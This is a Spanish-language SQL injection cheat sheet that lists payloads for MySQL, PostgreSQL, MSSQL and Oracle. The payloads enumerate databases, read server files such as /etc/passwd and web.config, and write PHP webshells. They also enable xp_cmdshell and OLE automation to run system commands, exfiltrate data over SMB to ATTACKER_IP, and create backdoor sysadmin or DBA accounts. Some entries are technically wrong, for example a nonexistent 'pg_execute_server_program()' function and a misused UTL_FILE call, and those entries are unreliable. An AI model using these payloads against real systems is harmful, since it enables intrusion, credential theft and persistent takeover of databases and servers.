# CheatSheet: SQLi         

## Fecha: 30/01/2025

## Objetivo
Establecer la teoria necearia para poder identificar en cada de base de datos los distnintos vectores de ataque.

## MySql

### **1. Diferencias clave en MySQL respecto a MSSQL**

-   **No siempre soporta stacked queries (`;`)**, a menos que tengas múltiples consultas habilitadas.
-   **Soporta `UNION SELECT`**, pero debe coincidir el número de columnas.
-   **Tiene funciones específicas útiles en SQLi**, como `LOAD_FILE()`, `INTO OUTFILE`, `INFORMATION_SCHEMA` y `BENCHMARK()`.

### **2. Enumeración de Base de Datos en MySQL**

Si puedes ejecutar consultas pero no ver los resultados, usa `error-based` o `time-based`.

#### **a) Error-Based SQLi**

Forzamos un error para extraer información:

```
' UNION SELECT 1,2,3,@@version; --  
```
Si falla, prueba generando un error explícito:
```
' UNION SELECT 1,2,3,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1); --  
```
Si la aplicación muestra mensajes de error, puedes extraer datos directamente.
#### **b) Time-Based Blind SQLi**

Si no se ve la respuesta, prueba una inyección de tiempo para confirmar la ejecución:

```
' OR IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0); --  
```
Si la consulta tarda 5 segundos, significa que la versión de MySQL comienza con "8". Puedes usar esto para extraer datos carácter por carácter.

### **3. Explotación Avanzada en MySQL**

#### **a) Leer Archivos del Servidor con `LOAD_FILE()`**

Si el usuario de la base de datos tiene permisos:
```
' UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd'); --  
```
Esto funciona en sistemas Linux y permite leer archivos accesibles por el usuario de MySQL.

#### **b) Escribir Archivos con `INTO OUTFILE`**

Si tienes permisos, puedes escribir un webshell en el servidor:

```
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20224F574E4544223B3F3E; --  
```
Esto escribe `<?php echo "OWNED"; ?>` en un archivo PHP accesible desde el navegador.
### **4. Escalada con `sys_exec()` y UDFs (User-Defined Functions)**

Si tienes permisos para crear funciones personalizadas (`root` en MySQL), puedes inyectar una función para ejecutar comandos en el sistema:

1.  **Sube una librería UDF maliciosa** (`lib_mysqludf_sys.so` en Linux o `.dll` en Windows).
2.  **Crea una función en MySQL:**
```
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
```
3. Ejecuta comandos:
```
SELECT sys_exec('whoami');
```
Este método es avanzado y depende de los permisos de usuario.


## PostgreSQL

### **1. Diferencias Clave en PostgreSQL**

-   **Soporta stacked queries (`;`)**, lo que facilita inyecciones avanzadas.
-   **Tiene funciones internas para ejecutar comandos en el sistema**, como `COPY FROM PROGRAM`.
-   **Es compatible con `UNION SELECT`, pero tiene su propio manejo de tipos de datos.**
-   **Usa `pg_sleep()` para inyección de tiempo.**
---

### **2. Enumeración de la Base de Datos**

Si podemos ejecutar consultas, pero no ver la respuesta en la interfaz, usamos **error-based** o **time-based**.

#### **a) Error-Based SQLi**

Forzamos un error para extraer información:
```
' UNION SELECT 1,2,3,(SELECT version()); --  
```
Otra forma es provocar un error intencionalmente con `CAST`:
```
' UNION SELECT 1,2,3,CAST((SELECT current_database()) AS INTEGER); --  
```
Si la aplicación muestra mensajes de error, puedes extraer datos directamente.

#### **b) Time-Based Blind SQLi**

Si no puedes ver la respuesta, prueba con `pg_sleep()`:
```
' OR (SELECT CASE WHEN (SUBSTRING((SELECT version()) FROM 1 FOR 1) = '1') THEN pg_sleep(5) ELSE pg_sleep(0) END); --  
```
Si la consulta tarda 5 segundos, significa que la versión de PostgreSQL comienza con "1".

---

### **3. Explotación Avanzada en PostgreSQL**

#### **a) Leer Archivos con `pg_read_file()`**

Si tienes los permisos adecuados, puedes leer archivos del servidor:
```
' UNION SELECT 1,2,3,pg_read_file('/etc/passwd', 0, 1000); --  
```
Esto extrae los primeros 1000 bytes de `/etc/passwd` en Linux.

#### **b) Escribir Archivos con `COPY TO`**

Si tienes permisos, puedes escribir un webshell en el servidor:
```
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```
Esto crea un archivo `shell.php` que permite ejecutar comandos a través del navegador.

#### **c) Ejecutar Comandos con `COPY FROM PROGRAM`**

Si el usuario de PostgreSQL tiene permisos, puedes ejecutar comandos del sistema:
```
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
```
Esto ejecuta `id` y almacena el resultado en `/tmp/output.txt`. Puedes leer el contenido después con `pg_read_file()`.
 
 ---

### **4. Escalada con `pg_execute_server_program()` (PostgreSQL 9.3+)**

Desde PostgreSQL 9.3 en adelante, podemos usar esta función para ejecutar comandos:

```
SELECT pg_execute_server_program('whoami');
```
Si funciona, significa que tenemos ejecución de comandos con privilegios del usuario de la base de datos.

##  MSSQL

### **1. Diferencias Clave en MSSQL**

-   **Stacked queries (`;`) son soportadas**, lo que permite ejecuciones más directas.
-   **Soporta `xp_cmdshell` para ejecutar comandos en el sistema**, si está habilitado.
-   **Tiene `OPENROWSET`, `sp_OA*` y funciones CLR para ejecución avanzada.**
-   **No usa `pg_sleep()` ni `BENCHMARK()`, pero puedes hacer delays con `WAITFOR DELAY`.**

---

### **2. Enumeración de la Base de Datos**

Si la inyección no muestra resultados directamente, puedes usar **error-based** o **time-based**.

#### **a) Error-Based SQLi**

Forzamos un error para extraer información:

```
' UNION SELECT 1,2,3,@@version; --  
```
O provocamos un error intencional con `CONVERT()`:
```
' UNION SELECT 1,2,3,CONVERT(INT, DB_NAME()); --  
```
Si la aplicación devuelve el error, podemos extraer datos caracter por caracter.

#### **b) Time-Based Blind SQLi**

>Si no podemos ver la respuesta, usamos `WAITFOR DELAY`:
```
' IF (SUBSTRING(@@version,1,1)='1') WAITFOR DELAY '0:0:5'; --  
```
Si la consulta se retrasa 5 segundos, significa que la versión de MSSQL empieza con "1".

---
### **3. Explotación Avanzada en MSSQL**

#### **a) Ejecución de Comandos con `xp_cmdshell`**

>Si está habilitada:
```
' EXEC xp_cmdshell 'whoami'; --
```
>Si no está habilitada, la activamos si tenemos permisos:
```
' EXEC sp_configure 'show advanced options', 1; --
' RECONFIGURE; -- 
' EXEC sp_configure 'xp_cmdshell', 1; --
' RECONFIGURE; --  
```
Después de esto, podemos usar `xp_cmdshell` para descargar y ejecutar archivos maliciosos.

#### **b) Uso de `sp_OACreate` (OLE Automation)**

>Si `xp_cmdshell` está deshabilitada y no podemos activarla, intentamos **OLE Automation Procedures**:

```
' EXEC sp_configure 'Ole Automation Procedures', 1; --
' RECONFIGURE; -- 
' DECLARE @o INT; --
' EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; --
' EXEC sp_OAMethod @o, 'Run', NULL, 'cmd.exe /c whoami > C:\inetpub\wwwroot\whoami.txt'; --
```
Esto ejecuta `whoami` y guarda la salida en `whoami.txt`.

#### **c) Uso de `OPENROWSET` para Leer Archivos**

>Si `xp_cmdshell` está bloqueada, podemos leer archivos con:

```
'SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS FileContents;--  
```
Esto es útil para extraer credenciales almacenadas en `web.config`.

#### **d) Abuso de Extended Stored Procedures (`xp_dirtree`)**

Podemos hacer un **out-of-band (OOB) exfiltration** filtrando datos a un recurso SMB controlado:

```
'EXEC master..xp_dirtree '\\ATTACKER_IP\share'; --
```
Si podemos capturar la solicitud SMB, significa que el servidor intentó conectarse con nosotros.

---
### **4. Persistencia y Escalada**

Si tenemos acceso administrativo, podemos crear una cuenta persistente en la base de datos:

```
'CREATE LOGIN hacker WITH PASSWORD = 'P@ssw0rd'; --
'EXEC sp_addsrvrolemember 'hacker', 'sysadmin'; -- 
```

Esto te da acceso completo incluso si cierran tu conexión inicial.


## Oeacle

### **1. Diferencias Clave en Oracle**

-   **No soporta `UNION SELECT` de la misma manera que MySQL o MSSQL.**
-   **No tiene `pg_sleep()` ni `WAITFOR DELAY`, pero usa `DBMS_PIPE.RECEIVE_MESSAGE`.**
-   **Las tablas `ALL_USERS`, `ALL_TABLES` y `ALL_TAB_COLUMNS` sirven para enumeración.**
-   **Ejecutar comandos en el sistema es más difícil, pero posible con `DBMS_SCHEDULER`.**

---

### **2. Enumeración de la Base de Datos**

Si puedes hacer consultas, pero no ves la salida directamente, puedes probar error-based o time-based.

#### **a) Error-Based SQLi**

Forzamos un error para extraer información:

```
' || (SELECT 1/0 FROM dual) || '  
```
>Si la aplicación devuelve el error, podemos filtrar información poco a poco.

Para extraer el nombre de usuario actual:

```
' || (SELECT USER FROM dual) || '  
```
Para obtener la versión de Oracle:
```
' || (SELECT banner FROM v$version WHERE rownum = 1) || '  
```
>Si devuelve errores con datos, podemos seguir extrayendo más información.

#### **b) Time-Based Blind SQLi**

Oracle no tiene `pg_sleep()` ni `WAITFOR DELAY`, pero se puede usar `DBMS_PIPE.RECEIVE_MESSAGE`:

```
' || DBMS_PIPE.RECEIVE_MESSAGE('X',5) || '  
```
Si la aplicación se retrasa 5 segundos, la inyección funciona.

---
### **3. Explotación Avanzada en Oracle**

#### **a) Listar Usuarios de la Base de Datos**
```
'SELECT username FROM all_users;--
```
Para ver los usuarios con privilegios:
```
'SELECT grantee FROM dba_sys_privs WHERE privilege = 'DBA';--
```
#### **b) Listar Tablas y Columnas**

>Si podemos hacer consultas, pero no conocemos las tablas:
```
SELECT table_name FROM all_tables;
```
Para encontrar columnas dentro de una tabla:
```
'SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';--
```
#### **c) Leer Archivos del Servidor**

Si tenemos permisos suficientes, puedes leer archivos del sistema con `UTL_FILE`:

```
SELECT UTL_FILE.FGET('C:\oracle\admin\orcl\udump\alert_orcl.log') FROM dual;
```
Esto leería un log de Oracle en Windows.

#### **d) Ejecución de Comandos con `DBMS_SCHEDULER`**

Si tenemos privilegios elevados, podemos ejecutar comandos en el sistema:

```
'BEGIN  
  DBMS_SCHEDULER.create_job(  
    job_name => 'cmd_exec',  
    job_type => 'EXECUTABLE',  
    job_action => '/bin/bash -c "whoami > /tmp/output.txt"',  
    enabled => TRUE  
  );  
END;--
```
Luego puedes leer `/tmp/output.txt` para ver la salida del comando.

---
### **4. Persistencia y Escalada en Oracle**

Si logras acceso como `DBA`, puedes crear un usuario persistente:

```
'CREATE USER hacker IDENTIFIED BY 'P@ssw0rd';--
'GRANT DBA TO hacker;--
```
Esto te da control total sobre la base de datos.
